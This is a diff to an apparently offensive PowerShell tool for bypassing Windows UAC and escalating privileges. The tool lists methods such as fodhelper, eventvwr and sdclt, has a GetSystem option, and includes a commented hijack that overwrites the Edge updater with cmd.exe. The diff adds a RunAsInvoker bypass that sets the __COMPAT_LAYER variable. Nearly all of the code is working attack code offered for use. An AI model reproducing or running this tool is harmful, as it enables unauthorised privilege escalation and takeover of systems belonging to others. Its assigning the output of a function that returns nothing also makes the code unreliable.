@@ -30,7 +30,10 @@
     Command to run elevated (default: cmd.exe)
 
 .PARAMETER GetSystem
-    Optional Command if you wish to start process as SYSTEM
+    Optional Command if you wish to start process as SYSTEM.
+
+.PARAMETER RunAsInvoker
+    Optional Command if you wish to bypass UAC for common lowlevel tools.
 #>
 
 
@@ -43,7 +46,10 @@ param(
     [string]$Command = "cmd.exe",
 
     [Parameter(Mandatory=$false)]
-    [switch]$GetSystem
+    [switch]$GetSystem,
+
+    [Parameter(Mandatory=$false)]
+    [switch]$RunAsInvoker
 )
 
 function Show-Banner {
@@ -76,6 +82,13 @@ function Invoke-GetSystem {
     # Edge SCHEDTASK Hijacking:
     # $Cmd = "cmd.exe /c `"copy /Y `"C:\Windows\System32\cmd.exe`" `"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe`"`""
     return $Cmd
+}
+
+function Invoke-RunAsInvoker {
+    param([string]$Cmd)
+    # RAI Bypass Fallback
+    $env:__COMPAT_LAYER = "RUNASINVOKER"
+    Start-Process $Cmd
 }
 
 function Cleanup-Registry {
@@ -218,29 +231,36 @@ function Invoke-AllMethods {
 #
 Show-Banner
 
+if ($RunAsInvoker) {
+    $Command = Invoke-RunAsInvoker -Cmd $Command
+    Write-Host "`n [!] Running RUNASINVOKER Bypass with command ($Command)" -ForegroundColor DarkCyan
+}
+
 if ($GetSystem) {
     $Command = Invoke-GetSystem -Cmd $Command
     Write-Host "`n [!] Running command ($Command) as NT\SYSTEM." -ForegroundColor DarkCyan
 }
 
-if (-not $Method) {
+if (-not $Method -and -not $RunAsInvoker) {
     Write-Host "`n [!] Please specify a Method. Valid values are: fodhelper, eventvwr, computerdefaults, sdclt, wsreset, mmc, eudcedit, netplwiz, all." -ForegroundColor Yellow
     exit
 }
 
-switch ($Method.ToLower()) {
-    "fodhelper" { Invoke-Fodhelper }
-    "eventvwr" { Invoke-Eventvwr }
-    "computerdefaults" { Invoke-ComputerDefaults }
-    "sdclt" { Invoke-Sdclt }
-    "wsreset" { Invoke-Wsreset }
-    "mmc" { Invoke-Mmc }
-    "eudcedit" { Invoke-Eudcedit }
-    "netplwiz" { Invoke-Netplwiz }
-    "all" { Invoke-AllMethods }
+if ($Method) {
+    switch ($Method.ToLower()) {
+        "fodhelper" { Invoke-Fodhelper }
+        "eventvwr" { Invoke-Eventvwr }
+        "computerdefaults" { Invoke-ComputerDefaults }
+        "sdclt" { Invoke-Sdclt }
+        "wsreset" { Invoke-Wsreset }
+        "mmc" { Invoke-Mmc }
+        "eudcedit" { Invoke-Eudcedit }
+        "netplwiz" { Invoke-Netplwiz }
+        "all" { Invoke-AllMethods }
 
-    default {
-        Write-Host "`n [!] Unknown Method '$Method'. Valid values are: fodhelper, eventvwr, computerdefaults, sdclt, wsreset, mmc, eudcedit, netplwiz, all." -ForegroundColor Red
-        exit
+        default {
+            Write-Host "`n [!] Unknown Method '$Method'. Valid values are: fodhelper, eventvwr, computerdefaults, sdclt, wsreset, mmc, eudcedit, netplwiz, all." -ForegroundColor Red
+            exit
+        }
     }
 }
